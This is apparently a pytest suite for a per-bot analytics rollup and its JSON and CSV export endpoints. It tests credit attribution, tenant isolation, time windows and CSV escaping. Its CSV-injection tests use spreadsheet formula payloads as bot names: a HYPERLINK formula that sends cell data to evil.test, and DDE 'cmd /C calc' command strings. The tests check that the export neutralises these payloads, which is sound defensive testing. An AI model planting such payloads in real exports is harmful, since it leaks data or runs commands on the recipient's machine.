"""Per-bot reporting rollup. Service aggregation + the /analytics/by-bot route.

The load-bearing case is the pooled deduction: an agency account spends from a
shared pool, so the ledger *scope* (``bot_id``) is NULL on every row while
``attributed_bot_id`` still names the bot that spent it. Grouping on the scope
would hand every agency client the same anonymous number; these tests pin the
attribution grouping, the consumption-reason filter, tenant isolation and the
window bounds.

Real-Postgres tests via the shared ``db`` fixture; skip without DB_URL.
"""

from __future__ import annotations

import csv
import io
import os
from contextlib import contextmanager
from datetime import UTC, datetime, timedelta

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from app.db.models import Bot, ChatSession, Client, CreditLedger, LeadInfo
from app.services.reporting_service import (
    CONSUMPTION_REASONS,
    _conversations_by_bot,
    _credits_by_bot,
    _leads_by_bot,
    get_per_bot_rollup,
)

pytestmark = pytest.mark.skipif(
    not os.getenv("DB_URL"),
    reason="per-bot rollup tests need a reachable Postgres at DB_URL",
)

NOW = datetime.now(UTC)
SINCE = NOW - timedelta(days=30)
UNTIL = NOW + timedelta(minutes=1)


# ── Fixture builders ─────────────────────────────────────────────────────────


@contextmanager
def _session_cm(session):
    yield session


def _make_client(db, *, email: str) -> Client:
    client = Client(name="c", email=email, api_key=email, hashed_password="h", is_verified=True)
    db.add(client)
    db.flush()
    return client


def _make_bot(db, client: Client, *, name: str, key: str) -> Bot:
    bot = Bot(client_id=client.id, bot_key=key, name=name)
    db.add(bot)
    db.flush()
    return bot


def _ledger(
    db,
    client: Client,
    *,
    delta: int,
    reason: str,
    attributed_bot_id: int | None,
    bot_id: int | None = None,
    created_at: datetime | None = None,
) -> None:
    """Write one ledger row. ``bot_id`` is the SCOPE (None = the shared pool)."""
    db.add(
        CreditLedger(
            client_id=client.id,
            bot_id=bot_id,
            attributed_bot_id=attributed_bot_id,
            delta=delta,
            reason=reason,
            created_at=created_at or NOW,
        )
    )


def _session_row(db, bot: Bot, *, sid: str, created_at: datetime | None = None) -> ChatSession:
    row = ChatSession(id=sid, client_id=bot.client_id, bot_id=bot.id, created_at=created_at or NOW)
    db.add(row)
    db.flush()
    return row


def _lead(db, bot: Bot, *, sid: str, created_at: datetime | None = None) -> None:
    _session_row(db, bot, sid=sid, created_at=created_at)
    db.add(LeadInfo(session_id=sid, bot_id=bot.id, email=f"{sid}@lead.com", created_at=created_at or NOW))


def _rollup(db, client: Client, *, since: datetime = SINCE, until: datetime = UNTIL) -> list[dict]:
    return get_per_bot_rollup(db, client_id=client.id, since=since, until=until)


# ── Service ──────────────────────────────────────────────────────────────────


def test_consumption_reasons_match_the_usage_page(db) -> None:
    """The rollup and the Usage trend must agree on what "credits used" means."""
    from app.api.subscription_routes import _CONSUMPTION_REASONS

    assert CONSUMPTION_REASONS == _CONSUMPTION_REASONS


def test_two_bots_on_one_client_split_by_attribution(db) -> None:
    client = _make_client(db, email="rollup-split@e.com")
    alpha = _make_bot(db, client, name="Alpha", key="bot-alpha")
    beta = _make_bot(db, client, name="Beta", key="bot-beta")
    quiet = _make_bot(db, client, name="Quiet", key="bot-quiet")

    _ledger(db, client, delta=-1, reason="ai_chat", attributed_bot_id=alpha.id, bot_id=alpha.id)
    _ledger(db, client, delta=-5, reason="url_scan", attributed_bot_id=alpha.id, bot_id=alpha.id)
    _ledger(db, client, delta=-3, reason="document_upload", attributed_bot_id=beta.id, bot_id=beta.id)
    _session_row(db, alpha, sid="s-alpha-1")
    _session_row(db, alpha, sid="s-alpha-2")
    _lead(db, beta, sid="s-beta-1")
    db.commit()

    rows = _rollup(db, client)

    # Sorted by credits spent, descending; the bot with no activity is omitted.
    assert [row["bot_id"] for row in rows] == [alpha.id, beta.id]
    assert quiet.id not in {row["bot_id"] for row in rows}
    assert rows[0] == {
        "bot_id": alpha.id,
        "bot_name": "Alpha",
        "credits_spent": 6,
        "conversations": 2,
        "leads": 0,
    }
    assert rows[1] == {
        "bot_id": beta.id,
        "bot_name": "Beta",
        "credits_spent": 3,
        "conversations": 1,
        "leads": 1,
    }


def test_grants_and_other_non_consumption_rows_are_excluded(db) -> None:
    client = _make_client(db, email="rollup-grant@e.com")
    bot = _make_bot(db, client, name="Alpha", key="bot-grant-alpha")

    _ledger(db, client, delta=-2, reason="ai_chat", attributed_bot_id=bot.id, bot_id=bot.id)
    # None of these are consumption: a grant, a monthly reset (a negative
    # plan_grant), a top-up, a refund, an expiry and a manual adjustment.
    _ledger(db, client, delta=500, reason="plan_grant", attributed_bot_id=bot.id, bot_id=bot.id)
    _ledger(db, client, delta=-400, reason="plan_grant", attributed_bot_id=bot.id, bot_id=bot.id)
    _ledger(db, client, delta=100, reason="topup", attributed_bot_id=bot.id, bot_id=bot.id)
    _ledger(db, client, delta=7, reason="refund", attributed_bot_id=bot.id, bot_id=bot.id)
    _ledger(db, client, delta=-9, reason="expiry", attributed_bot_id=bot.id, bot_id=bot.id)
    _ledger(db, client, delta=-11, reason="manual_adjust", attributed_bot_id=bot.id, bot_id=bot.id)
    db.commit()

    rows = _rollup(db, client)
    assert len(rows) == 1
    assert rows[0]["credits_spent"] == 2


def test_pooled_deduction_is_attributed_to_the_spending_bot(db) -> None:
    """The whole point: scope is the shared pool, attribution is per bot."""
    client = _make_client(db, email="rollup-pooled@e.com")
    alpha = _make_bot(db, client, name="Alpha", key="bot-pool-alpha")
    beta = _make_bot(db, client, name="Beta", key="bot-pool-beta")

    # bot_id IS NULL. Every row lives in the client-level pool ledger.
    _ledger(db, client, delta=-4, reason="ai_chat", attributed_bot_id=alpha.id, bot_id=None)
    _ledger(db, client, delta=-6, reason="ai_chat", attributed_bot_id=beta.id, bot_id=None)
    _ledger(db, client, delta=-10, reason="email_verification", attributed_bot_id=beta.id, bot_id=None)
    # A legacy pooled row with no attribution at all cannot be assigned to a
    # bot and must simply not appear.
    _ledger(db, client, delta=-99, reason="ai_chat", attributed_bot_id=None, bot_id=None)
    db.commit()

    rows = _rollup(db, client)
    by_id = {row["bot_id"]: row["credits_spent"] for row in rows}
    assert by_id == {beta.id: 16, alpha.id: 4}
    # Descending by credits. Beta first despite being created second.
    assert rows[0]["bot_id"] == beta.id


def test_another_clients_data_never_appears(db) -> None:
    """Tenant isolation: the join runs through Bot.client_id, both ways."""
    mine = _make_client(db, email="rollup-mine@e.com")
    theirs = _make_client(db, email="rollup-theirs@e.com")
    my_bot = _make_bot(db, mine, name="Mine", key="bot-iso-mine")
    their_bot = _make_bot(db, theirs, name="Theirs", key="bot-iso-theirs")

    _ledger(db, mine, delta=-1, reason="ai_chat", attributed_bot_id=my_bot.id, bot_id=my_bot.id)
    _ledger(db, theirs, delta=-50, reason="ai_chat", attributed_bot_id=their_bot.id, bot_id=their_bot.id)
    _session_row(db, their_bot, sid="s-theirs-1")
    _lead(db, their_bot, sid="s-theirs-2")
    # A row on MY ledger that points at THEIR bot (mis-attribution / a bot that
    # changed hands). It must leak in neither direction.
    _ledger(db, mine, delta=-77, reason="ai_chat", attributed_bot_id=their_bot.id, bot_id=None)
    db.commit()

    mine_rows = _rollup(db, mine)
    assert [row["bot_id"] for row in mine_rows] == [my_bot.id]
    assert mine_rows[0]["credits_spent"] == 1
    assert their_bot.id not in {row["bot_id"] for row in mine_rows}
    assert "Theirs" not in {row["bot_name"] for row in mine_rows}

    theirs_rows = _rollup(db, theirs)
    assert [row["bot_id"] for row in theirs_rows] == [their_bot.id]
    # 50 only. My mis-attributed 77 never lands on their report either.
    assert theirs_rows[0] == {
        "bot_id": their_bot.id,
        "bot_name": "Theirs",
        "credits_spent": 50,
        "conversations": 2,
        "leads": 1,
    }


def test_each_aggregate_is_tenant_scoped_on_its_own(db) -> None:
    """Every aggregate carries its OWN ``Bot.client_id`` filter.

    The rollup drops unknown bots again when it resolves names, which would
    mask a missing filter end-to-end. Asserting on each query separately means
    isolation is proven where it is enforced, not by a downstream backstop.
    """
    mine = _make_client(db, email="rollup-scope-mine@e.com")
    theirs = _make_client(db, email="rollup-scope-theirs@e.com")
    my_bot = _make_bot(db, mine, name="Mine", key="bot-scope-mine")
    their_bot = _make_bot(db, theirs, name="Theirs", key="bot-scope-theirs")

    _ledger(db, mine, delta=-1, reason="ai_chat", attributed_bot_id=my_bot.id, bot_id=None)
    _ledger(db, theirs, delta=-50, reason="ai_chat", attributed_bot_id=their_bot.id, bot_id=None)
    # On MY ledger, attributed to THEIR bot. Only the Bot.client_id join drops it.
    _ledger(db, mine, delta=-77, reason="ai_chat", attributed_bot_id=their_bot.id, bot_id=None)
    _session_row(db, my_bot, sid="s-scope-mine")
    _session_row(db, their_bot, sid="s-scope-theirs")
    _lead(db, my_bot, sid="s-scope-lead-mine")
    _lead(db, their_bot, sid="s-scope-lead-theirs")
    db.commit()

    window = {"client_id": mine.id, "since": SINCE, "until": UNTIL}
    assert _credits_by_bot(db, **window) == {my_bot.id: 1}
    assert _conversations_by_bot(db, **window) == {my_bot.id: 2}
    assert _leads_by_bot(db, **window) == {my_bot.id: 1}

    their_window = {"client_id": theirs.id, "since": SINCE, "until": UNTIL}
    assert _credits_by_bot(db, **their_window) == {their_bot.id: 50}
    assert _conversations_by_bot(db, **their_window) == {their_bot.id: 2}
    assert _leads_by_bot(db, **their_window) == {their_bot.id: 1}


def test_window_boundaries_exclude_out_of_range_rows(db) -> None:
    client = _make_client(db, email="rollup-window@e.com")
    bot = _make_bot(db, client, name="Alpha", key="bot-window-alpha")

    inside = NOW - timedelta(days=5)
    before = NOW - timedelta(days=40)
    after = NOW + timedelta(days=2)

    _ledger(db, client, delta=-2, reason="ai_chat", attributed_bot_id=bot.id, bot_id=bot.id, created_at=inside)
    _ledger(db, client, delta=-800, reason="ai_chat", attributed_bot_id=bot.id, bot_id=bot.id, created_at=before)
    _ledger(db, client, delta=-900, reason="ai_chat", attributed_bot_id=bot.id, bot_id=bot.id, created_at=after)
    _session_row(db, bot, sid="s-win-in", created_at=inside)
    _session_row(db, bot, sid="s-win-before", created_at=before)
    _session_row(db, bot, sid="s-win-after", created_at=after)
    _lead(db, bot, sid="s-win-lead-in", created_at=inside)
    _lead(db, bot, sid="s-win-lead-before", created_at=before)
    db.commit()

    rows = _rollup(db, client)
    assert rows == [
        {
            "bot_id": bot.id,
            "bot_name": "Alpha",
            "credits_spent": 2,
            "conversations": 2,  # the in-window session + the in-window lead's session
            "leads": 1,
        }
    ]

    # A window that contains nothing yields no rows at all.
    empty_since = NOW - timedelta(days=20)
    empty_until = NOW - timedelta(days=10)
    assert _rollup(db, client, since=empty_since, until=empty_until) == []


# ── Route ────────────────────────────────────────────────────────────────────


def _api(client: Client) -> TestClient:
    from app.api import analytics_routes
    from app.api.auth import get_current_client_or_operator

    app = FastAPI()
    app.include_router(analytics_routes.router)
    app.dependency_overrides[get_current_client_or_operator] = lambda: {"client_id": client.id}
    return TestClient(app, raise_server_exceptions=False)


def _call(db, client: Client, *, days: int | None = None):
    from unittest.mock import patch

    from app.api import analytics_routes

    url = "/analytics/by-bot" if days is None else f"/analytics/by-bot?days={days}"
    with patch.object(analytics_routes, "get_session", lambda: _session_cm(db)):
        return _api(client).get(url)


def test_endpoint_returns_rows_and_totals(db) -> None:
    client = _make_client(db, email="rollup-route@e.com")
    other = _make_client(db, email="rollup-route-other@e.com")
    alpha = _make_bot(db, client, name="Alpha", key="bot-route-alpha")
    beta = _make_bot(db, client, name="Beta", key="bot-route-beta")
    intruder = _make_bot(db, other, name="Intruder", key="bot-route-intruder")

    _ledger(db, client, delta=-8, reason="ai_chat", attributed_bot_id=alpha.id, bot_id=None)
    _ledger(db, client, delta=-3, reason="company_name", attributed_bot_id=beta.id, bot_id=None)
    _session_row(db, alpha, sid="s-route-1")
    _lead(db, beta, sid="s-route-2")
    _ledger(db, other, delta=-1000, reason="ai_chat", attributed_bot_id=intruder.id, bot_id=None)
    db.commit()

    res = _call(db, client)
    assert res.status_code == 200, res.text
    body = res.json()

    assert body["totals"] == {"credits_spent": 11, "conversations": 2, "leads": 1}
    assert [row["bot_name"] for row in body["rows"]] == ["Alpha", "Beta"]
    assert "Intruder" not in {row["bot_name"] for row in body["rows"]}

    # The window echoes back as ISO-8601 and spans the default 30 days.
    since = datetime.fromisoformat(body["since"])
    until = datetime.fromisoformat(body["until"])
    assert (until - since) == timedelta(days=30)


def test_endpoint_rejects_out_of_bounds_days(db) -> None:
    client = _make_client(db, email="rollup-route-bounds@e.com")
    db.commit()

    assert _call(db, client, days=0).status_code == 422
    assert _call(db, client, days=366).status_code == 422
    assert _call(db, client, days=1).status_code == 200


def test_endpoint_returns_empty_rows_and_zero_totals_when_quiet(db) -> None:
    client = _make_client(db, email="rollup-route-quiet@e.com")
    _make_bot(db, client, name="Alpha", key="bot-route-quiet-alpha")
    db.commit()

    res = _call(db, client)
    assert res.status_code == 200, res.text
    body = res.json()
    assert body["rows"] == []
    assert body["totals"] == {"credits_spent": 0, "conversations": 0, "leads": 0}


# ── CSV export ───────────────────────────────────────────────────────────────
#
# The agency hands this file to its own client, so it leaves OyeChats' trust
# boundary entirely: the rows must match the dashboard exactly, the filename
# must say which window it covers, and a customer-typed agent name must never
# execute in the recipient's spreadsheet.


def _call_csv(db, client: Client, *, days: int | None = None):
    from unittest.mock import patch

    from app.api import analytics_routes

    url = "/analytics/by-bot.csv" if days is None else f"/analytics/by-bot.csv?days={days}"
    with patch.object(analytics_routes, "get_session", lambda: _session_cm(db)):
        return _api(client).get(url)


def _parse_csv(res) -> list[list[str]]:
    """Read the response body back through a real CSV parser."""
    return list(csv.reader(io.StringIO(res.text)))


def _expected_filenames(before: datetime, after: datetime, *, days: int) -> set[str]:
    """Every filename the route could legitimately have produced.

    The route stamps its own ``datetime.now(UTC)``, so a request that straddles
    midnight UTC may land on either date. Both are correct.
    """
    return {
        f"oyechats-report-{(moment - timedelta(days=days)):%Y-%m-%d}-to-{moment:%Y-%m-%d}.csv"
        for moment in (before, after)
    }


def test_csv_sends_a_dated_attachment(db) -> None:
    client = _make_client(db, email="rollup-csv-headers@e.com")
    bot = _make_bot(db, client, name="Alpha", key="bot-csv-headers-alpha")
    _ledger(db, client, delta=-2, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
    db.commit()

    before = datetime.now(UTC)
    res = _call_csv(db, client, days=7)
    after = datetime.now(UTC)

    assert res.status_code == 200, res.text
    assert res.headers["content-type"].startswith("text/csv")
    disposition = res.headers["content-disposition"]
    assert disposition.startswith("attachment; ")
    assert disposition in {f'attachment; filename="{name}"' for name in _expected_filenames(before, after, days=7)}


def test_csv_rows_match_the_json_endpoint(db) -> None:
    """Same window, same auth, same rows, in the same order, tenant-scoped."""
    client = _make_client(db, email="rollup-csv-rows@e.com")
    other = _make_client(db, email="rollup-csv-rows-other@e.com")
    alpha = _make_bot(db, client, name="Alpha", key="bot-csv-rows-alpha")
    beta = _make_bot(db, client, name="Beta", key="bot-csv-rows-beta")
    intruder = _make_bot(db, other, name="Intruder", key="bot-csv-rows-intruder")

    _ledger(db, client, delta=-8, reason="ai_chat", attributed_bot_id=alpha.id, bot_id=None)
    _ledger(db, client, delta=-3, reason="company_name", attributed_bot_id=beta.id, bot_id=None)
    _session_row(db, alpha, sid="s-csv-1")
    _session_row(db, alpha, sid="s-csv-2")
    _lead(db, beta, sid="s-csv-3")
    _ledger(db, other, delta=-1000, reason="ai_chat", attributed_bot_id=intruder.id, bot_id=None)
    db.commit()

    res = _call_csv(db, client)
    assert res.status_code == 200, res.text

    rows = _parse_csv(res)
    # Header, then one row per active agent. Columns are agent name,
    # conversations, leads, credits used. Credits LAST, unlike the JSON row
    # shape, so the reading order matches how the report is talked about.
    assert rows == [
        ["Agent", "Conversations", "Leads", "Credits used"],
        ["Alpha", "2", "0", "8"],
        # Beta's lead created its own session, so it has one conversation too.
        ["Beta", "1", "1", "3"],
    ]

    # The other account's agent appears nowhere in the file, not as a row,
    # not as a stray name.
    assert "Intruder" not in res.text

    # And the same request against the JSON endpoint agrees, row for row.
    body = _call(db, client).json()
    assert [row["bot_name"] for row in body["rows"]] == [row[0] for row in rows[1:]]


def test_csv_is_empty_but_well_formed_for_a_quiet_account(db) -> None:
    client = _make_client(db, email="rollup-csv-quiet@e.com")
    _make_bot(db, client, name="Alpha", key="bot-csv-quiet-alpha")
    db.commit()

    res = _call_csv(db, client)
    assert res.status_code == 200, res.text
    # Still a valid CSV a spreadsheet can open, a header and nothing else.
    assert _parse_csv(res) == [["Agent", "Conversations", "Leads", "Credits used"]]


def test_csv_rejects_out_of_bounds_days(db) -> None:
    """Identical window validation to the JSON endpoint."""
    client = _make_client(db, email="rollup-csv-bounds@e.com")
    db.commit()

    assert _call_csv(db, client, days=0).status_code == 422
    assert _call_csv(db, client, days=366).status_code == 422
    assert _call_csv(db, client, days=90).status_code == 200


# ── CSV injection ────────────────────────────────────────────────────────────
#
# Two layers, deliberately. The escape itself is unit-tested against the whole
# OWASP trigger list in ``test_csv_safety.py`` (DB-free, so it runs everywhere);
# the tests below prove the escape is actually wired into the response a
# customer downloads, which is the half that a refactor can quietly break.


@pytest.mark.parametrize(
    ("slug", "payload"),
    [
        ("hyperlink", '=HYPERLINK("https://evil.test/?"&A1,"Click")'),
        ("plus", '+cmd|" /C calc"!A0'),
        ("minus", '-2+3+cmd|" /C calc"!A0'),
        ("at", "@SUM(1+1)*cmd|' /C calc'!A0"),
        ("tab", "\t=1+1"),
    ],
)
def test_csv_export_neutralises_a_customer_typed_agent_name(db, slug: str, payload: str) -> None:
    """A bot name is customer-controlled and must never execute on open."""
    client = _make_client(db, email=f"rollup-csv-inject-{slug}@e.com")
    bot = _make_bot(db, client, name=payload, key=f"bot-csv-inject-{slug}")
    _ledger(db, client, delta=-1, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
    db.commit()

    res = _call_csv(db, client)
    assert res.status_code == 200, res.text

    rows = _parse_csv(res)
    assert len(rows) == 2, rows
    cell = rows[1][0]
    assert cell == f"'{payload}"
    assert not cell.startswith(("=", "+", "-", "@", "\t", "\r"))
    # The other columns are untouched integers.
    assert rows[1][1:] == ["0", "0", "1"]


def test_csv_export_neutralises_a_cr_prefixed_agent_name(db) -> None:
    """The CR case, asserted on the raw body.

    A bare CR inside a quoted field is a line terminator to ``csv.reader``'s
    universal-newline handling, so round-tripping it through the parser would
    be testing the stdlib rather than the escape. The bytes on the wire are
    what the recipient's spreadsheet sees, so assert on those.
    """
    client = _make_client(db, email="rollup-csv-inject-cr@e.com")
    bot = _make_bot(db, client, name="\r=1+1", key="bot-csv-inject-cr")
    _ledger(db, client, delta=-1, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
    db.commit()

    res = _call_csv(db, client)
    assert res.status_code == 200, res.text
    # Quoted by the writer (it contains a line-terminator character) AND
    # prefixed with the escape, so the cell can neither break the record apart
    # nor start with a formula trigger.
    assert '"\'\r=1+1"' in res.text
    assert "\n\r=1+1" not in res.text


def test_csv_export_leaves_an_ordinary_agent_name_alone(db) -> None:
    """RFC-4180 territory. Handled by the writer's quoting, not by the escape."""
    client = _make_client(db, email="rollup-csv-plain@e.com")
    bot = _make_bot(db, client, name='Acme, Inc. "Main"', key="bot-csv-plain")
    _ledger(db, client, delta=-4, reason="ai_chat", attributed_bot_id=bot.id, bot_id=None)
    db.commit()

    res = _call_csv(db, client)
    assert res.status_code == 200, res.text
    rows = _parse_csv(res)
    assert rows[1][0] == 'Acme, Inc. "Main"'
